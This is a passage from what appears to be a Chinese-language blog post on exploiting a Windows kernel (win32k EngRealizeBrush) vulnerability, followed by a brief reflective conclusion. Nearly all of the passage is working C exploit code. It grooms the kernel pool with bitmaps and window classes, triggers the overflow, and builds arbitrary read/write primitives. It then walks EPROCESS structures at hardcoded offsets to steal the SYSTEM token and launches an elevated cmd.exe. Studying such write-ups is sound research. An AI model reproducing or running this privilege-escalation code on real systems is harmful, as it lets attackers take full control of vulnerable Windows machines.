        if (pNextEprocess)
        `{`
            DWORD dwCurPidAddr = (DWORD)pNextEprocess + 0xB4;
            DWORD dwCurPid = BitMapRead((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)dwCurPidAddr);
            if (dwCurPid == GetCurrentProcessId())
            `{`
                printf("find Current eprocess Pid %08X~~~rn", dwCurPid);
                DWORD dwCurTokenAddr = (DWORD)pNextEprocess + 0xF8;
                BitMapWrite((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)dwCurTokenAddr, dwToken);
                printf("stolen Token suc~~~rn");
                break;
            `}`
            pActiveProcessLinks = (PVOID)((DWORD)pNextEprocess + 0xb8);
            pNextEprocess = (PVOID)BitMapRead((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, pActiveProcessLinks);
            pNextEprocess = (PVOID)((DWORD)pNextEprocess - 0xb8);
            printf("pNextEprocess %prn", pNextEprocess);
        `}`
        else
        `{`
            printf("not find Current eprocess~~~rn");
            break;
        `}`
    `}`
`}`

void runCalc()
`{`
    STARTUPINFO StartupInfo = `{` 0 `}`;
    PROCESS_INFORMATION ProcessInformation = `{` 0 `}`;
    StartupInfo.wShowWindow = SW_SHOW;
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    if (!CreateProcess(NULL,
        "cmd.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &amp;StartupInfo,
        &amp;ProcessInformation)) `{`
        exit(EXIT_FAILURE);
    `}`
    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
`}`

void BitmapReleaseMem_xD88()
`{`
    for (LONG i = 0; i &lt; Bitmap_Count; i++)
    `{`
        DeleteObject(g_aryhBitmapxD88[i]);
        g_aryhBitmapxD88[i] = NULL;
    `}`
`}`

void BitmapReleaseMem_x260()
`{`
    for (LONG i = 0; i &lt; Bitmap_Washer_Count; i++)
    `{`
        DeleteObject(g_aryhBitmapx260[i]);
        g_aryhBitmapx260[i] = NULL;
    `}`
`}`


int _tmain(int argc, _TCHAR* argv[])`{`
    BitmapHoleMem_xFE8();
    printf("BitmapHoleMem_xFE8rn");
    system("pause");
    WndClassHoleMem_x18();
    printf("WndClassHoleMem_x18rn");
    system("pause");
    BitmapReleaseMem_xFE8();
    printf("BitmapReleaseMem_xFE8rn");
    system("pause");
    BitmapHoleMem_xD88();
    printf("BitmapHoleMem_xD88rn");
    system("pause");
    BitmapHoleMem_x260();
    printf("BitmapHoleMem_x260rn");
    system("pause");
    WndClassReleaseMem_x18();
    printf("WndClassReleaseMem_x18rn");
    system("pause");
    TriggerEngRealizeBrush();
    printf("TriggerEngRealizeBrushrn");
    system("pause");
    BuildArbitraryWR();
    printf("BuildArbitraryWRrn");
    system("pause");
    FixPoolHead();
    printf("FixPoolHeadrn");
    system("pause");
    FixBaseObjHandle();
    printf("FixBaseObjHandle fixrn");
    system("pause");
    PrivilegeUp();
    printf("PrivilegeUprn");
    system("pause");
    runCalc();
    printf("runCalcrn");
    system("pause");
    BitmapReleaseMem_xD88();
    BitmapReleaseMem_x260();
    printf("BitmapReleaseMemrn");
    system("pause");
      return 0;
`}`
```



## 总结

这次的Windows内核漏洞探索，收获很多，但是更多的是看到自己和大佬的差距还有很大。希望以后能慢慢赶上。（大牛勿喷，小白卑微）
